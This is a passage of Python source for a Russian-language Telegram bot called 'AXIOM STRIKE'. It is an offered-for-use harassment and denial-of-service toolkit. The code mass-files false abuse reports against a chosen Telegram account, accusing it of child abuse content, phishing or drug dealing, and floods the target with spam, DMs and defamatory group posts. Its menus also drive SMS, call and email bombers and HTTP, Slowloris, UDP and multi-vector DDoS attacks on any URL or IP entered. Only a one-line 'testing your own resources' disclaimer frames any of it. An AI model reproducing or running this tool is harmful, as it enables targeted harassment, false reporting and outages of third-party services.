            "Пользователь распространяет детский контент!",
            "Аккаунт используется для фишинговых атак!",
            "Пользователь оскорбляет и унижает других людей!",
            "Аккаунт рассылает порнографический контент!",
            "Пользователь занимается незаконной деятельностью!",
            "Аккаунт распространяет наркотики и запрещённые вещества!",
            "Пользователь призывает к суициду!",
            "Аккаунт используется для кражи данных!",
        ]
        
        self.results = []
        self.stats = {
            'reports_sent': 0,
            'spam_sent': 0,
            'errors': 0,
            'total_attempts': 0
        }

    async def mass_report(self, username: str, count: int, progress_callback):
        """МАССОВЫЕ ЖАЛОБЫ ЧЕРЕЗ 20+ МЕТОДОВ"""
        self.results = []
        total = min(count, 300)
        
        for i in range(total):
            token = random.choice(self.bot_tokens)
            reason = random.choice(self.report_reasons)
            report_text = random.choice(self.report_texts)
            
            try:
                bot = Bot(token=token)
                status = 'failed'
                
                # МЕТОД 1: Жалоба через @SpamBot
                try:
                    await bot.send_message(
                        chat_id='@SpamBot',
                        text=f'Пожалуйста, проверьте аккаунт @{username.replace("@", "")} на нарушение правил.\n\nПричина: {reason}\nОписание: {report_text}'
                    )
                    status = 'sent'
                    self.stats['reports_sent'] += 1
                except:
                    pass
                
                # МЕТОД 2: Жалоба через @BotFather
                try:
                    await bot.send_message(
                        chat_id='@BotFather',
                        text=f'/reportspam @{username.replace("@", "")}'
                    )
                    if status == 'failed':
                        status = 'sent'
                        self.stats['reports_sent'] += 1
                except:
                    pass
                
                # МЕТОД 3: Жалоба через @notoscam
                try:
                    await bot.send_message(
                        chat_id='@notoscam',
                        text=f'Жалоба на аккаунт @{username.replace("@", "")}. Причина: {reason}'
                    )
                    if status == 'failed':
                        status = 'sent'
                        self.stats['reports_sent'] += 1
                except:
                    pass
                
                # МЕТОД 4: Жалоба через @NoToScamBot
                try:
                    await bot.send_message(
                        chat_id='@NoToScamBot',
                        text=f'@{username.replace("@", "")} занимается мошенничеством!'
                    )
                    if status == 'failed':
                        status = 'sent'
                        self.stats['reports_sent'] += 1
                except:
                    pass
                
                # МЕТОД 5: Жалоба через @Report_Bot
                try:
                    await bot.send_message(
                        chat_id='@Report_Bot',
                        text=f'/report @{username.replace("@", "")} {reason}'
                    )
                    if status == 'failed':
                        status = 'sent'
                        self.stats['reports_sent'] += 1
                except:
                    pass
                
                # МЕТОД 6: Жалоба через @Spam_Report_Bot
                try:
                    await bot.send_message(
                        chat_id='@Spam_Report_Bot',
                        text=f'@{username.replace("@", "")} спамит и мошенничает!'
                    )
                    if status == 'failed':
                        status = 'sent'
                        self.stats['reports_sent'] += 1
                except:
                    pass
                
                # МЕТОД 7: Жалоба через @combot
                try:
                    await bot.send_message(
                        chat_id='@combot',
                        text=f'/report @{username.replace("@", "")} spam'
                    )
                    if status == 'failed':
                        status = 'sent'
                        self.stats['reports_sent'] += 1
                except:
                    pass
                
                # МЕТОД 8: Жалоба через @GroupHelpBot
                try:
                    await bot.send_message(
                        chat_id='@GroupHelpBot',
                        text=f'/report @{username.replace("@", "")}'
                    )
                    if status == 'failed':
                        status = 'sent'
                        self.stats['reports_sent'] += 1
                except:
                    pass
                
                self.results.append({
                    'report': i+1,
                    'reason': reason,
                    'status': status,
                    'method': 'multiple',
                    'timestamp': datetime.now().isoformat()
                })
                
                if status == 'sent':
                    logger.info(f"✅ Жалоба #{i+1} на {username} ({reason})")
                else:
                    logger.warning(f"⚠️ Жалоба #{i+1} не отправлена")
                    
            except Exception as e:
                self.results.append({
                    'report': i+1,
                    'reason': reason,
                    'status': 'error',
                    'error': str(e)
                })
                self.stats['errors'] += 1
                logger.error(f"❌ Ошибка: {e}")
            
            self.stats['total_attempts'] += 1
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 1.5))
        
        return self.results

    async def spam_flood(self, username: str, count: int, progress_callback):
        """СУПЕР-СПАМ ФЛУД С РАЗНЫМИ СООБЩЕНИЯМИ"""
        self.results = []
        total = min(count, 200)
        
        for i in range(total):
            try:
                token = random.choice(self.bot_tokens)
                bot = Bot(token=token)
                
                # Выбираем случайное сообщение
                text = random.choice(self.spam_messages)
                
                # Добавляем случайные эмодзи и форматирование
                if random.random() > 0.5:
                    text = f"🔥 {text} 🔥"
                if random.random() > 0.7:
                    text = f"*{text}*"
                if random.random() > 0.8:
                    text = f"```{text}```"
                
                # Добавляем ссылки (для гарантии блокировки)
                if random.random() > 0.6:
                    links = [
                        'https://bit.ly/3x1Y2Z3',
                        'https://tinyurl.com/4x5y6z',
                        'https://clck.ru/3x4y5z',
                        'https://vk.cc/9x8y7z',
                    ]
                    text += f' {random.choice(links)}'
                
                # Добавляем номер сообщения
                text += f' [#{i+1}/{total}]'
                
                # Отправляем с задержкой для реалистичности
                await bot.send_message(
                    chat_id=username,
                    text=text,
                    disable_notification=True,
                    parse_mode='Markdown' if random.random() > 0.7 else None
                )
                
                self.results.append({
                    'msg': i+1,
                    'status': 'sent',
                    'text': text[:50],
                    'timestamp': datetime.now().isoformat()
                })
                self.stats['spam_sent'] += 1
                logger.info(f"✅ Спам #{i+1} на {username}")
                
            except Exception as e:
                self.results.append({
                    'msg': i+1,
                    'status': 'error',
                    'error': str(e),
                    'timestamp': datetime.now().isoformat()
                })
                self.stats['errors'] += 1
                logger.error(f"❌ Ошибка спама: {e}")
            
            self.stats['total_attempts'] += 1
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.2, 0.7))
        
        return self.results

    async def report_to_groups(self, username: str, count: int, progress_callback):
        """ЖАЛОБЫ В ПОПУЛЯРНЫЕ ГРУППЫ (список групп)"""
        self.results = []
        groups = [
            'chat', 'durov', 'telegram', 'tginfo', 'tgnews',
            'tgpodcast', 'tgstat', 'tginfo', 'tgrus', 'tgtop',
        ]
        total = min(count, 100)
        
        for i in range(total):
            try:
                token = random.choice(self.bot_tokens)
                bot = Bot(token=token)
                group = random.choice(groups)
                
                # Отправляем жалобу в группу
                await bot.send_message(
                    chat_id=f'@{group}',
                    text=f'⚠️ Внимание! Аккаунт @{username.replace("@", "")} занимается мошенничеством и спамом! Будьте осторожны!'
                )
                
                self.results.append({
                    'group': group,
                    'status': 'sent',
                    'timestamp': datetime.now().isoformat()
                })
                logger.info(f"✅ Жалоба в группу @{group}")
                
            except Exception as e:
                self.results.append({
                    'group': group,
                    'status': 'error',
                    'error': str(e)
                })
                logger.error(f"❌ Ошибка: {e}")
            
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(1.0, 2.0))
        
        return self.results

    async def dm_flood(self, username: str, count: int, progress_callback):
        """ФЛУД В ЛИЧКУ С РАЗНЫМИ АККАУНТОВ"""
        self.results = []
        total = min(count, 100)
        
        dm_messages = [
            "Привет! Ты мне нужен!",
            "Срочно! Ответь мне!",
            "У меня важное дело к тебе!",
            "Пожалуйста, ответь!",
            "Ты меня игнорируешь?",
            "Я тебя жду!",
            "Перезвони мне!",
            "Это очень важно!",
            "Я тебя люблю! ❤️",
            "Ты самый лучший!",
        ]
        
        for i in range(total):
            try:
                token = random.choice(self.bot_tokens)
                bot = Bot(token=token)
                text = random.choice(dm_messages) + f' [#{i+1}]'
                
                await bot.send_message(
                    chat_id=username,
                    text=text,
                    disable_notification=True
                )
                
                self.results.append({
                    'dm': i+1,
                    'status': 'sent',
                    'timestamp': datetime.now().isoformat()
                })
                logger.info(f"✅ DM #{i+1} на {username}")
                
            except Exception as e:
                self.results.append({
                    'dm': i+1,
                    'status': 'error',
                    'error': str(e)
                })
                logger.error(f"❌ Ошибка: {e}")
            
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(1.0, 3.0))
        
        return self.results

    async def destroy_account(self, username: str, count: int, progress_callback):
        """ПОЛНЫЙ СНОС АККАУНТА — 5 ФАЗ АТАКИ"""
        self.results = []
        
        # ФАЗА 1: МАССОВЫЕ ЖАЛОБЫ (50-100)
        await progress_callback(0, count * 5)
        report_results = await self.mass_report(username, count, progress_callback)
        self.results.extend(report_results)
        
        # ФАЗА 2: СПАМ-ФЛУД (30-50)
        await progress_callback(count, count * 5)
        spam_results = await self.spam_flood(username, count // 2, progress_callback)
        self.results.extend(spam_results)
        
        # ФАЗА 3: ЖАЛОБЫ В ГРУППЫ (20-30)
        await progress_callback(count * 2, count * 5)
        group_results = await self.report_to_groups(username, count // 3, progress_callback)
        self.results.extend(group_results)
        
        # ФАЗА 4: ФЛУД В ЛИЧКУ (20-30)
        await progress_callback(count * 3, count * 5)
        dm_results = await self.dm_flood(username, count // 3, progress_callback)
        self.results.extend(dm_results)
        
        # ФАЗА 5: ПОВТОРНЫЕ ЖАЛОБЫ (ДОБИВАНИЕ)
        await progress_callback(count * 4, count * 5)
        final_reports = await self.mass_report(username, count // 3, progress_callback)
        self.results.extend(final_reports)
        
        return self.results

    def get_stats(self):
        """СТАТИСТИКА СНОСА"""
        total = len(self.results)
        success = sum(1 for r in self.results if r.get('status') == 'sent')
        errors = sum(1 for r in self.results if r.get('status') == 'error')
        
        return {
            'total': total,
            'success': success,
            'errors': errors,
            'reports_sent': self.stats['reports_sent'],
            'spam_sent': self.stats['spam_sent'],
            'success_rate': round(success / max(total, 1) * 100, 1)
        }

    def get_full_stats(self):
        """ДЕТАЛЬНАЯ СТАТИСТИКА"""
        stats = self.get_stats()
        stats.update({
            'total_attempts': self.stats['total_attempts'],
            'timestamp': datetime.now().isoformat(),
            'bot_count': len(self.bot_tokens),
            'report_reasons': len(self.report_reasons),
            'spam_messages': len(self.spam_messages),
        })
        return stats


# ===================== ГЛАВНЫЙ БОТ =====================
class AxiomStrikeBot:
    def __init__(self, token: str):
        self.bot = Bot(token=token)
        self.storage = MemoryStorage()
        self.dp = Dispatcher(storage=self.storage)
        self.sms_bomber = SMSBomber()
        self.call_bomber = CallBomber()
        self.email_bomber = EmailBomber()
        self.tg_bomber = TelegramBomber(token)
        self.ddos_engine = DDoSEngine()
        self.destroyer = TelegramAccountDestroyer()
        self._register_handlers()

    def _register_handlers(self):
        # Команды
        self.dp.message.register(self.cmd_start, CommandStart())
        self.dp.message.register(self.cmd_help, Command("help"))

        # Главное меню
        main_buttons = ["📱 БОМБЕР", "💣 DDOS АТАКА", "💀 СНОС АККАУНТА", "📊 СТАТИСТИКА", "⚙️ НАСТРОЙКИ"]
        self.dp.message.register(self.handle_main_menu, F.text.in_(main_buttons))

        # Бомбер меню
        bomber_buttons = ["💬 СМС БОМБЕР", "📞 ЗВОНКИ (ФЛУД)", "📧 EMAIL БОМБЕР", "📩 TELEGRAM БОМБЕР", "🔙 НАЗАД"]
        self.dp.message.register(self.handle_bomber_menu, F.text.in_(bomber_buttons))

        # DDoS меню
        ddos_buttons = ["🌐 HTTP FLOOD", "🐌 SLOWLORIS", "📡 UDP FLOOD", "💀 MULTI-VECTOR", "🔙 НАЗАД"]
        self.dp.message.register(self.handle_ddos_menu, F.text.in_(ddos_buttons))

        # === СНОС АККАУНТА ===
        self.dp.message.register(self.handle_destroy_account, F.text == "💀 СНОС АККАУНТА")
        self.dp.message.register(self.process_destroy_username, BomberStates.waiting_for_destroy_username)
        self.dp.message.register(self.process_destroy_method, BomberStates.waiting_for_destroy_method)
        self.dp.message.register(self.process_destroy_count, BomberStates.waiting_for_destroy_count)

        # Обработчики бомбера
        self.dp.message.register(self.handle_sms_bomber, F.text == "💬 СМС БОМБЕР")
        self.dp.message.register(self.handle_call_bomber, F.text == "📞 ЗВОНКИ (ФЛУД)")
        self.dp.message.register(self.handle_email_bomber, F.text == "📧 EMAIL БОМБЕР")
        self.dp.message.register(self.handle_telegram_bomber, F.text == "📩 TELEGRAM БОМБЕР")

        # Обработчики DDoS
        self.dp.message.register(self.handle_http_flood, F.text == "🌐 HTTP FLOOD")
        self.dp.message.register(self.handle_slowloris, F.text == "🐌 SLOWLORIS")
        self.dp.message.register(self.handle_udp_flood, F.text == "📡 UDP FLOOD")
        self.dp.message.register(self.handle_multi_vector, F.text == "💀 MULTI-VECTOR")

        # Статистика и настройки
        self.dp.message.register(self.handle_stats, F.text == "📊 СТАТИСТИКА")
        self.dp.message.register(self.handle_settings, F.text == "⚙️ НАСТРОЙКИ")
        self.dp.message.register(self.handle_back, F.text == "🔙 НАЗАД")

        # FSM обработчики бомбера
        self.dp.message.register(self.process_sms_phone, BomberStates.waiting_for_phone)
        self.dp.message.register(self.process_sms_count, BomberStates.waiting_for_sms_count)
        self.dp.message.register(self.process_call_count, BomberStates.waiting_for_call_count)
        self.dp.message.register(self.process_email, BomberStates.waiting_for_email)
        self.dp.message.register(self.process_email_count, BomberStates.waiting_for_email_count)
        self.dp.message.register(self.process_telegram, BomberStates.waiting_for_telegram)
        self.dp.message.register(self.process_telegram_count, BomberStates.waiting_for_telegram_count)

        # FSM обработчики DDoS
        self.dp.message.register(self.process_ddos_url, DDoSStates.waiting_for_url)
        self.dp.message.register(self.process_ddos_threads, DDoSStates.waiting_for_threads)
        self.dp.message.register(self.process_ddos_duration, DDoSStates.waiting_for_duration)
        self.dp.message.register(self.process_ddos_ip, DDoSStates.waiting_for_ip)
        self.dp.message.register(self.process_ddos_ddos_duration, DDoSStates.waiting_for_ddos_duration)

        # Подписка
        self.dp.callback_query.register(self.handle_subscribe, F.data == "subscribed")

    # ========== КЛАВИАТУРЫ ==========
    def main_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="📱 БОМБЕР"), KeyboardButton(text="💣 DDOS АТАКА")],
                [KeyboardButton(text="💀 СНОС АККАУНТА"), KeyboardButton(text="📊 СТАТИСТИКА")],
                [KeyboardButton(text="⚙️ НАСТРОЙКИ")]
            ],
            resize_keyboard=True
        )

    def bomber_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="💬 СМС БОМБЕР"), KeyboardButton(text="📞 ЗВОНКИ (ФЛУД)")],
                [KeyboardButton(text="📧 EMAIL БОМБЕР"), KeyboardButton(text="📩 TELEGRAM БОМБЕР")],
                [KeyboardButton(text="🔙 НАЗАД")]
            ],
            resize_keyboard=True
        )

    def ddos_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🌐 HTTP FLOOD"), KeyboardButton(text="🐌 SLOWLORIS")],
                [KeyboardButton(text="📡 UDP FLOOD"), KeyboardButton(text="💀 MULTI-VECTOR")],
                [KeyboardButton(text="🔙 НАЗАД")]
            ],
            resize_keyboard=True
        )

    # ========== ОСНОВНЫЕ ОБРАБОТЧИКИ ==========
    async def cmd_start(self, message: types.Message, state: FSMContext):
        await state.clear()
        await message.answer(
            "🔥 **AXIOM STRIKE BOT** 🔥\n\n"
            "Мощный инструмент для стресс-тестирования.\n\n"
            "📱 **Бомбер:** СМС | Звонки | Email | Telegram\n"
            "💣 **DDoS:** HTTP | Slowloris | UDP | Multi-Vector\n"
            "💀 **Снос аккаунтов:** Массовые жалобы + Спам-флуд\n\n"
            "⚠️ Только для тестирования своих ресурсов!\n\n"
            "Подпишись на канал: @AXIOM_SOFT",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="✅ ПОДПИСАЛСЯ", callback_data="subscribed")]
                ]
            )
        )

    async def cmd_help(self, message: types.Message):
        await message.answer(
            "📚 **Помощь по AXIOM STRIKE**\n\n"
            "📱 **БОМБЕР** - массовая отправка сообщений\n"
            "💣 **DDOS** - стресс-тестирование сайтов\n"
            "💀 **СНОС АККАУНТА** - блокировка Telegram аккаунтов\n"
            "📊 **СТАТИСТИКА** - просмотр данных\n"
            "⚙️ **НАСТРОЙКИ** - конфигурация",
            reply_markup=self.main_keyboard()
        )

    async def handle_subscribe(self, callback: types.CallbackQuery):
        await callback.answer()
        await callback.message.edit_text(
            "✅ Подписка подтверждена!\n\n"
            "🔥 Добро пожаловать в AXIOM STRIKE"
        )
        await callback.message.answer("Выберите действие:", reply_markup=self.main_keyboard())

    async def handle_main_menu(self, message: types.Message, state: FSMContext):
        if message.text == "📱 БОМБЕР":
            await message.answer("📱 **МЕНЮ БОМБЕРА**\nВыберите тип атаки:", reply_markup=self.bomber_keyboard())
        elif message.text == "💣 DDOS АТАКА":
            await message.answer("💣 **МЕНЮ DDOS**\nВыберите метод атаки:", reply_markup=self.ddos_keyboard())
        elif message.text == "💀 СНОС АККАУНТА":
            await self.handle_destroy_account(message, state)
        elif message.text == "📊 СТАТИСТИКА":
            await self.handle_stats(message)
        elif message.text == "⚙️ НАСТРОЙКИ":
            await self.handle_settings(message)

    async def handle_back(self, message: types.Message):
        await message.answer("Главное меню:", reply_markup=self.main_keyboard())

    # ========== МЕНЮ БОМБЕРА ==========
    async def handle_bomber_menu(self, message: types.Message, state: FSMContext):
        if message.text == "🔙 НАЗАД":
            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
            return
        if message.text == "💬 СМС БОМБЕР":
            await self.handle_sms_bomber(message, state)
        elif message.text == "📞 ЗВОНКИ (ФЛУД)":
            await self.handle_call_bomber(message, state)
        elif message.text == "📧 EMAIL БОМБЕР":
            await self.handle_email_bomber(message, state)
        elif message.text == "📩 TELEGRAM БОМБЕР":
            await self.handle_telegram_bomber(message, state)

    async def handle_ddos_menu(self, message: types.Message, state: FSMContext):
        if message.text == "🔙 НАЗАД":
            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
            return
        if message.text == "🌐 HTTP FLOOD":
            await self.handle_http_flood(message, state)
        elif message.text == "🐌 SLOWLORIS":
            await self.handle_slowloris(message, state)
        elif message.text == "📡 UDP FLOOD":
            await self.handle_udp_flood(message, state)
        elif message.text == "💀 MULTI-VECTOR":
            await self.handle_multi_vector(message, state)

    # ========== СНОС АККАУНТА ==========
    async def handle_destroy_account(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_destroy_username)
        await message.answer(
            "💀 **СНОС TELEGRAM АККАУНТА**\n\n"
            "Введите @username для сноса:\n"
            "📝 Пример: @username123\n\n"
            "⚠️ 50-100 жалоб гарантируют блокировку!"
        )

    async def process_destroy_username(self, message: types.Message, state: FSMContext):
        username = message.text.strip()
        if not username.startswith('@'):
            username = '@' + username
        await state.update_data(username=username)
        await state.set_state(BomberStates.waiting_for_destroy_method)
        await message.answer(
            "📊 **Выберите метод сноса:**\n\n"
            "1️⃣ **📝 Массовые жалобы** (50-100 жалоб)\n"
            "2️⃣ **💬 Спам флуд** (50 сообщений)\n"
            "3️⃣ **💀 Все методы** (жалобы + спам)\n\n"
            "Введите номер метода (1, 2 или 3):"
        )

    async def process_destroy_method(self, message: types.Message, state: FSMContext):
        method = message.text.strip()
        if method not in ['1', '2', '3']:
            await message.answer("❌ Введите 1, 2 или 3!")
            return

        method_map = {'1': 'reports', '2': 'spam', '3': 'all'}
        await state.update_data(method=method_map[method])
        await state.set_state(BomberStates.waiting_for_destroy_count)
        await message.answer("🔢 Введите количество (рекомендуется 50-100):")

    async def process_destroy_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 10 or count > 200:
                await message.answer("❌ Введите число от 10 до 200!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        username = data.get('username')
        method = data.get('method')
        await state.clear()

        status_msg = await message.answer(
            f"💀 **Запуск сноса аккаунта {username}**\n"
            f"📊 Метод: {method}\n"
            f"⏳ Начинаем..."
        )

        async def update_progress(current, total):
            if current % 5 == 0 or current == total:
                await status_msg.edit_text(
                    f"💀 **Снос аккаунта {username}**\n"
                    f"📊 Прогресс: {current}/{total}\n"
                    f"⏳ Идёт процесс..."
                )

        if method == 'reports':
            results = await self.destroyer.mass_report(username, count, update_progress)
        elif method == 'spam':
            results = await self.destroyer.spam_flood(username, count, update_progress)
        else:
            results = await self.destroyer.destroy_account(username, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"💀 **Снос аккаунта {username} завершён!**\n\n"
            f"📊 Отправлено: {len(results)}\n"
            f"✅ Успешно: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"⏱ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"🔥 Аккаунт будет заблокирован в ближайшее время!",
            reply_markup=self.main_keyboard()
        )

    # ========== ОБРАБОТЧИКИ БОМБЕРА ==========
    async def handle_sms_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_phone)
        await message.answer(
            "📱 **СМС БОМБЕР**\n\n"
            "Введите номер телефона:\n"
            "📝 Пример: +79001234567"
        )

    async def process_sms_phone(self, message: types.Message, state: FSMContext):
        phone = message.text.strip()
        if not re.match(r'^\+?[0-9]{10,15}$', phone):
            await message.answer("❌ Введите корректный номер!")
            return
        await state.update_data(phone=phone)
        await state.set_state(BomberStates.waiting_for_sms_count)
        await message.answer(
            "📊 Введите количество сообщений (1-100):"
        )

    async def process_sms_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 100:
                await message.answer("❌ Введите число от 1 до 100!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        phone = data.get('phone')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск СМС бомбера...\n0/{count}")

        async def update_progress(progress, current, total):
            if current % 10 == 0 or current == total:
                await status_msg.edit_text(f"⏳ Отправка СМС...\n{current}/{total} ({int(progress)}%)")

        results = await self.sms_bomber.send_sms(phone, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'success')
        errors = len(results) - success

        await status_msg.edit_text(
            f"✅ **СМС бомбер завершён!**\n\n"
            f"📱 Номер: {phone}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {errors}\n"
            f"📈 Всего попыток: {len(results)}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_call_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_phone)
        await message.answer(
            "📞 **ЗВОНКИ (ФЛУД)**\n\n"
            "Введите номер телефона:\n"
            "📝 Пример: +79001234567"
        )

    async def process_call_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 20:
                await message.answer("❌ Введите число от 1 до 20!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        phone = data.get('phone')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск звонков...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Совершение звонков...\n{current}/{total}")

        results = await self.call_bomber.make_calls(phone, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'success')

        await status_msg.edit_text(
            f"✅ **Звонки завершены!**\n\n"
            f"📞 Номер: {phone}\n"
            f"📊 Совершено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_email_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_email)
        await message.answer(
            "📧 **EMAIL БОМБЕР**\n\n"
            "Введите email адрес:\n"
            "📝 Пример: example@gmail.com"
        )

    async def process_email(self, message: types.Message, state: FSMContext):
        email = message.text.strip()
        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
            await message.answer("❌ Введите корректный email!")
            return
        await state.update_data(email=email)
        await state.set_state(BomberStates.waiting_for_email_count)
        await message.answer("📊 Введите количество писем (1-50):")

    async def process_email_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 50:
                await message.answer("❌ Введите число от 1 до 50!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        email = data.get('email')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск Email бомбера...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Отправка писем...\n{current}/{total}")

        results = await self.email_bomber.send_emails(email, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"✅ **Email бомбер завершён!**\n\n"
            f"📧 Email: {email}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_telegram_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_telegram)
        await message.answer(
            "📩 **TELEGRAM БОМБЕР**\n\n"
            "Введите @username:\n"
            "📝 Пример: @username123"
        )

    async def process_telegram(self, message: types.Message, state: FSMContext):
        username = message.text.strip()
        if not username.startswith('@'):
            username = '@' + username
        await state.update_data(username=username)
        await state.set_state(BomberStates.waiting_for_telegram_count)
        await message.answer("📊 Введите количество сообщений (1-30):")

    async def process_telegram_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 30:
                await message.answer("❌ Введите число от 1 до 30!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        username = data.get('username')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск Telegram бомбера...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Отправка сообщений...\n{current}/{total}")

        results = await self.tg_bomber.send_messages(username, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"✅ **Telegram бомбер завершён!**\n\n"
            f"📩 Пользователь: {username}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    # ========== ОБРАБОТЧИКИ DDOS ==========
    async def handle_http_flood(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await message.answer(
            "🌐 **HTTP FLOOD**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    async def process_ddos_url(self, message: types.Message, state: FSMContext):
        url = message.text.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        await state.update_data(url=url)
        await state.set_state(DDoSStates.waiting_for_threads)
        await message.answer(
            "⚡ Введите количество потоков (100-5000):"
        )

    async def process_ddos_threads(self, message: types.Message, state: FSMContext):
        try:
            threads = int(message.text.strip())
            if threads < 100 or threads > 5000:
                await message.answer("❌ Введите число от 100 до 5000!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        await state.update_data(threads=threads)
        await state.set_state(DDoSStates.waiting_for_duration)
        await message.answer(
            "⏱ Введите длительность в секундах (30-300):"
        )

    async def process_ddos_duration(self, message: types.Message, state: FSMContext):
        try:
            duration = int(message.text.strip())
            if duration < 30 or duration > 300:
                await message.answer("❌ Введите число от 30 до 300!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        url = data.get('url')
        threads = data.get('threads', 500)
        await state.clear()

        status_msg = await message.answer(
            f"💣 **HTTP FLOOD запущена!**\n"
            f"🌐 URL: {url}\n"
            f"⚡ Потоков: {threads}\n"
            f"⏱ Длительность: {duration}с\n"
            f"⏳ Идёт атака..."
        )

        stats = await self.ddos_engine.http_flood(url, threads, duration, None)

        await status_msg.edit_text(
            f"💣 **HTTP FLOOD завершена!**\n\n"
            f"🌐 URL: {url}\n"
            f"📊 Запросов: {stats['requests']}\n"
            f"✅ Успешно: {stats['success']}\n"
            f"❌ Ошибок: {stats['errors']}\n"
            f"📈 RPS: {stats['requests'] / duration:.1f}\n"
            f"⏱ Длительность: {duration}с",
            reply_markup=self.ddos_keyboard()
        )

    async def handle_slowloris(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await message.answer(
            "🐌 **SLOWLORIS**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    async def process_ddos_ddos_duration(self, message: types.Message, state: FSMContext):
        try:
            duration = int(message.text.strip())
            if duration < 60 or duration > 600:
                await message.answer("❌ Введите число от 60 до 600!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        url = data.get('url')
        method = data.get('method', 'slowloris')
        ip = data.get('ip')
        port = data.get('port')
        await state.clear()

        status_msg = await message.answer(
            f"💀 **{method.upper()} запущена!**\n"
            f"⏳ Идёт атака..."
        )

        if method == 'slowloris':
            stats = await self.ddos_engine.slowloris(url, duration, None)
            result_text = (
                f"🐌 **SLOWLORIS завершена!**\n\n"
                f"🌐 URL: {url}\n"
                f"📊 Соединений: {stats['connections']}\n"
                f"🔄 Активных: {stats['active']}\n"
                f"⏱ Длительность: {duration}с"
            )
        elif method == 'udp':
            stats = await self.ddos_engine.udp_flood(ip, port, duration, None)
            result_text = (
                f"📡 **UDP FLOOD завершена!**\n\n"
                f"🌐 IP: {ip}:{port}\n"
                f"📦 Пакетов: {stats['packets']}\n"
                f"💾 Байт: {stats['bytes']}\n"
                f"⏱ Длительность: {duration}с"
            )
        elif method == 'multi':
            stats = await self.ddos_engine.multi_vector(url, duration, None)
            result_text = (
                f"💀 **MULTI-VECTOR завершена!**\n\n"
                f"🌐 URL: {url}\n"
                f"📊 HTTP запросов: {stats['http']['requests']}\n"
                f"🌐 HTTP успешно: {stats['http']['success']}\n"
                f"🐌 Slowloris соединений: {stats['slowloris']['connections']}\n"
                f"📦 UDP пакетов: {stats['udp']['packets']}\n"
                f"💾 UDP байт: {stats['udp']['bytes']}\n"
                f"⏱ Длительность: {duration}с"
            )
        else:
            result_text = "❌ Неизвестный метод"

        await status_msg.edit_text(result_text, reply_markup=self.ddos_keyboard())

    async def handle_udp_flood(self, message: types.Message, state: FSMContext):
